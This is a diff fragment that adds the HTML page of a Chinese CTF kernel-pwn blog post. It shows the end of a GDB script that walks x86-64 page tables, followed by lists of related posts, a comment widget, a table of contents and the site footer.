+    set $pdptephy = $result + (($target &gt;&gt; 30) &amp; $mask9) * 8
+    set $pdpte = *(unsigned long*)($directmappingbase + $pdptephy)
+    printf "pdpte: 0x%016lx at 0x%08x\n", $pdpte, $pdptephy
+
+    phy4pxe $pdpte
+    if (($pdpte &gt;&gt; 7) &amp; 1) == 0
+        set $pdephy = $result + (($target &gt;&gt; 21) &amp; $mask9) * 8
+        set $pde = *(unsigned long*)($directmappingbase + $pdephy)
+        printf "pde  : 0x%016lx at 0x%08x\n", $pde, $pdephy
+
+        phy4pxe $pde
+        if (($pde &gt;&gt; 7) &amp; 1) == 0
+            set $ptephy = $result + (($target &gt;&gt; 12) &amp; $mask9) * 8
+            set $pte = *(unsigned long*)($directmappingbase + $ptephy)
+            printf "pte  : 0x%016lx at 0x%08x\n", $pte, $ptephy
+
+            phy4pxe $pte
+            set $res_mask = $mask12
+        else
+            set $res_mask = $mask21
+        end
+    else
+        set $res_mask = $mask30
+    end
+
+    printf "phy  : 0x%lx [0x%08x-0x%08x]\n", $result + ($target &amp; $res_mask), $result, $result + $res_mask
+end
+</code></pre>
+
+              </div>
+                
+                  <b>本博客上与 pwn 相关的贴子：</b>
+                  <ul>
+                    
+                    
+                      <li><a href="/2025/10/11/MidnightSunFinal-2025-Flop.html">Midnight Sun CTF 2025 Final - flop</a></li>
+                    
+                      <li><a href="/2025/04/11/SJTUCTF-2025.html">SJTU CTF 2025 PWN Writeup</a></li>
+                    
+                      <li><a href="/2025/01/20/XHLJ-2025.html">西湖论剑 2025 PWN Writeup</a></li>
+                    
+                      <li><a href="/2024/07/24/CISCN-Final-2024.html">CISCN Final 2024</a></li>
+                    
+                      <li><a href="/2024/04/18/BlackHatMEA2023-House-of-Minho.html">BlackHatMEA 2023 House of Minho</a></li>
+                    
+                      <li><a href="/2024/02/19/VNCTF2024-escape-langlang-mountain2.html">VNCTF 2024 escape_langlang_mountain2</a></li>
+                    
+                      <li><a href="/2023/11/29/HITCTF2023-xv6-Trusted.html">HITCTF 2023 xv6-Trusted</a></li>
+                    
+                      <li><a href="/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html">TAMUctf 2023 Pwnme - linked ROP chain</a></li>
+                    
+                      <li><a href="/2023/04/04/Bing-Chilling.html">UTCTF 2023 Bing Chilling</a></li>
+                    
+                  </ul>
+                
+              
+                
+                  <b>本博客上与 kernel 相关的贴子：</b>
+                  <ul>
+                    
+                    
+                      <li><a href="/2025/10/11/MidnightSunFinal-2025-Flop.html">Midnight Sun CTF 2025 Final - flop</a></li>
+                    
+                      <li><a href="/2025/09/28/Kernel-0.html">Kernel: 环境配置</a></li>
+                    
+                      <li><a href="/2025/01/06/GhostWrite-2.html">GhostWrite #2: 漏洞利用代码分析</a></li>
+                    
+                      <li><a href="/2024/09/16/GhostWrite-1.html">GhostWrite #1: 漏洞利用思路介绍</a></li>
+                    
+                      <li><a href="/2023/11/29/HITCTF2023-xv6-Trusted.html">HITCTF 2023 xv6-Trusted</a></li>
+                    
+                  </ul>
+                
+              
+
+              <br><br>
+              <div id="comments"></div>
+              <script>
+  new Valine({
+    el: "#comments",
+    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
+    app_key: "6VqGye1352LX381YQDTOaiXs",
+    placeholder: "El Psy Congroo",
+  });
+</script>
+
+
+              <a class="u-url" href="/2025/10/11/MidnightSunFinal-2025-Flop.html" hidden></a>
+            </article>
+          </div>
+        </div>
+      </div>
+
+      <!-- 右侧目录区域 -->
+      <div class="toc-sidebar">
+        <div class="toc-container">
+          <h3>目录</h3>
+          <div class="toc" id="toc-auto">
+            
+            <ul><li><a href="#题目分析">题目分析</a></li><li><a href="#利用">利用</a><ul><li><a href="#方法1劫持内核代码">方法1：劫持内核代码</a></li><li><a href="#方法-2搜索-ramdisk-中的-flag-文件todo">方法 2：搜索 ramdisk 中的 flag 文件（TODO）</a></li></ul></li><li><a href="#附录">附录</a></li></ul>
+          </div>
+        </div>
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div style="float: left; width: 75%;">
+
+      <h2 class="footer-heading">Y² 的博客</h2>
+
+      <div class="footer-col-wrapper">
+        <div class="footer-col footer-col-1">
+          <ul class="contact-list">
+            <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
+        </div>
+
+        <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
+</div>
+
+        <div class="footer-col footer-col-3">
+          <!-- <p>计算机、安全和其他</p> -->
+        </div>
+      </div>
+      
+    </div>
+
+    <div style="float: right;">
+      <script type="text/javascript" id="clstr_globe" src="//clustrmaps.com/globe.js?d=L7huRZdkUrGTYSGRyT_6pbao13uOO-F0vUN54U4t8po&w=150"></script>
+      <!-- <script type="text/javascript" id="clustrmaps" src="//clustrmaps.com/map_v2.js?d=L7huRZdkUrGTYSGRyT_6pbao13uOO-F0vUN54U4t8po&cl=ffffff&w=200"></script> -->
+    </div>
+
+  </div>
+
+</footer>
+<script src="/assets/js/post.js"></script>
+
+  </body>
+
+</html>
